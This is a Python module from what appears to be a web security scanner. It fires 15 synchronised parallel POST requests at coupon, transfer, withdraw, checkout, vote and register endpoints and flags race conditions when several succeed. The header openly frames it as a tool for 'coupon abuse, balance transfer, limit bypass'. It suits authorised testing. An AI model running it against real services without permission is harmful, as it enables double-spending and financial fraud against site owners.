"""
Trace Foundry V5 - Race Condition Engine
Parallel request sender: coupon abuse, balance transfer, limit bypass
"""
import urllib.request
import urllib.error
import urllib.parse
import threading
import time
import json
from utils.display import section, ok, warn, info, bug_found

RACE_ENDPOINTS = [
    {"path": "/api/coupon/apply",       "param": "code",   "value": "DISCOUNT10"},
    {"path": "/api/v1/coupon/redeem",   "param": "coupon", "value": "PROMO2026"},
    {"path": "/api/transfer",           "param": "amount", "value": "100"},
    {"path": "/api/v1/transfer",        "param": "amount", "value": "100"},
    {"path": "/api/vote",               "param": "id",     "value": "1"},
    {"path": "/api/like",               "param": "id",     "value": "1"},
    {"path": "/api/redeem",             "param": "code",   "value": "GIFT"},
    {"path": "/api/v1/redeem",          "param": "token",  "value": "abc123"},
    {"path": "/api/checkout",           "param": "cart_id","value": "1"},
    {"path": "/api/v1/checkout",        "param": "id",     "value": "1"},
    {"path": "/api/withdraw",           "param": "amount", "value": "100"},
    {"path": "/api/claim",              "param": "reward", "value": "daily"},
    {"path": "/register",               "param": "email",  "value": "race@test.com"},
    {"path": "/api/v1/register",        "param": "email",  "value": "race@test.com"},
]

class RaceConditionModule:
    def __init__(self, domain, timeout=8):
        self.domain  = domain
        self.timeout = timeout
        self.results = []
        self.lock    = threading.Lock()

    def _send_request(self, url, method="POST", data=None):
        try:
            post_data = urllib.parse.urlencode(data).encode() if data else b""
            req = urllib.request.Request(url, data=post_data, method=method)
            req.add_header("User-Agent", "Mozilla/5.0")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(8192).decode("utf-8", errors="ignore")
                return r.status, body
        except urllib.error.HTTPError as e:
            try:    body = e.read(4096).decode("utf-8", errors="ignore")
            except: body = ""
            return e.code, body
        except:
            return 0, ""

    def _race_test(self, url, data, n_threads=15):
        """Send N simultaneous requests and collect responses"""
        responses = []
        threads   = []
        barrier   = threading.Barrier(n_threads)

        def worker():
            barrier.wait()  # All threads start at same time
            status, body = self._send_request(url, data=data)
            with self.lock:
                responses.append((status, body))

        for _ in range(n_threads):
            t = threading.Thread(target=worker)
            threads.append(t)

        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 2)

        return responses

    def _analyze_race_responses(self, responses, url):
        """Detect race condition based on response patterns"""
        if not responses:
            return None

        status_counts = {}
        for status, _ in responses:
            status_counts[status] = status_counts.get(status, 0) + 1

        success_codes = [s for s in status_counts if s in (200, 201)]
        total         = len(responses)

        # If multiple 200s from parallel requests — likely race condition
        if success_codes:
            success_count = sum(status_counts[s] for s in success_codes)
            if success_count >= 2:
                return {
                    "type":     "Race Condition — Parallel Request Accepted",
                    "severity": "HIGH",
                    "url":      url,
                    "evidence": f"{success_count}/{total} simultaneous requests succeeded (expected max 1)",
                    "impact":   "Double-spending, coupon abuse, vote stuffing, balance manipulation",
                    "statuses": str(status_counts),
                }

        return None

    def run(self):
        section("Race Condition Engine (Parallel Request Sender)")
        all_bugs = []

        for ep in RACE_ENDPOINTS:
            for scheme in ["https", "http"]:
                url  = f"{scheme}://{self.domain}{ep['path']}"
                data = {ep["param"]: ep["value"]}

                # First check if endpoint exists
                status, _ = self._send_request(url, data=data)
                if status == 0:
                    continue

                if status in (404, 405):
                    break

                info(f"Race testing: {url} ({15} parallel threads)")

                responses = self._race_test(url, data, n_threads=15)
                result    = self._analyze_race_responses(responses, url)

                if result:
                    bug_found(result["type"], result["severity"], {
                        "URL":       result["url"],
                        "Evidence":  result["evidence"],
                        "Statuses":  result["statuses"],
                        "Impact":    result["impact"],
                        "How to PoC": f"Send 15 simultaneous POST to {url}",
                    })
                    all_bugs.append(result)

                break

        info(f"Race condition scan done — {len(all_bugs)} findings")
        if not all_bugs:
            ok("No race conditions found ✓")
        return {"bugs": all_bugs}
